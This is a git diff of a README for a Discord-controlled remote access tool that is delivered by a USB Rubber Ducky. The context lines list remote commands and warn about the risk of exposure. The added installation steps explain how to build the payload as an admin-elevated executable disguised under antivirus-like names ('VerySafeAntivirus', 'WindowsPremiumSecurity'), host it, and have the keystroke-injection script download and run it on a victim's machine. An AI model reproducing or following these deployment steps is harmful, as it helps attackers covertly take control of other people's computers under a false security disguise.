@@ -18,3 +18,16 @@ My remote access script can be loaded onto a USB Rubber Ducky or a similar devic
 * `.enter` - Presses the enter key on the client
 * `.shutdown` - Shuts the client's computer down, it will show a confirmation pop-up and the bot will also be shutdown before you can allow the shutdown, **HIGH RISK OF EXPOSURE**
 * `.k` - Instantly kills the bot but leaves the client's computer on
+
+## Installation
+1. Follow the steps [here](https://youtu.be/-H4yoyXlrEQ?si=jpTu1eZHZhg_42M7) to make your Discord bot, you can even make 1 per client (multiple clients are not supported for one bot)
+2. Open the "VerySafeAntivirus.py" file and put your token and ID in (near line 29-30)
+3. Install auto-py-to-exe `pip install auto-py-to-exe` and build the exe, make sure to check the following settings:
+	- One file
+	- Window Based
+	- Advanced > --name = WindowsPremiumSecurity
+	- Advanced > --clean = Enable
+	- Advanced > Windows specific options > --uac-admin = Enable
+4. Upload this file somewhere the script can download it
+5. Modify script.txt and replace the GitHub URL (under "Download install script") with the download URL for YOUR exe file
+6. You're done! Just load up the script.txt on your USB Rubber Ducky and have fun!
